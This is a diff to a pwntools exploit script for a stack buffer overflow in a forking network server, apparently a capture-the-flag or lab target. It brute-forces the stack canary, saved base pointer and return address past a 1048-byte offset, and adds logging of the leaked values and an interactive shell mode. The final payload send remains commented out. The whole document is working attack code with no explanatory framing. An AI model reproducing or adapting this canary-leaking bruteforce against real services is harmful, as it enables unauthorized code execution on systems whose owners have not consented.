@@ -42,6 +42,7 @@ def start(argv=[], *a, **kw):
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
 gdbscript = '''
+break main
 set follow-fork-mode child
 continue
 '''.format(**locals())
@@ -77,14 +78,18 @@ config['rip_off'] = 1048
 # create a connection to the server
 # send some data
 # check if it crashed ;)
-def server_check(prefix_size, data, prefix = ""):
+def server_check(prefix_size, data, prefix = "", keep = False):
     io = start()
     to_send = config['username'] + \
               cyclic(prefix_size - len(config['username']) - len(prefix)) + \
               prefix + data
+
+    print (len(to_send), to_send)
     io.sendafter(PROMPT_MSG, to_send)
     recv_data = io.clean()
-    io.close()
+    print (recv_data)
+    if not keep: io.close()
+    else: io.interactive()
 
     return SUCCESS_MSG in recv_data
 
@@ -128,13 +133,19 @@ if 'rip' not in config:
     config['rip'] = bruteforce_value(config['rip_off'],
                                      prefix = config['cookie'] + config['rbp'])
 
+log.info("Cookie: " + hex(unpack(config['cookie'])))
+log.info("RBP: " + hex(unpack(config['rbp'])))
+log.info("RIP: " + hex(unpack(config['rip'])))
+
+
 # check if leaked values are still good (debug only)
-"""
-alive = server_check(config['buf_size'], config['cookie'])
+alive = server_check(config['buf_size'], config['cookie'] + config['rbp'] + config['rip'], keep = True)
 if not alive:
     log.error("Stack cookie is wrong")
-"""
+else:
+    log.success("Good stack cookie")
 
+exit()
 #log.info("Payload")
 #io.sendafter(PROMPT_MSG, payload)
 #print (io.clean())
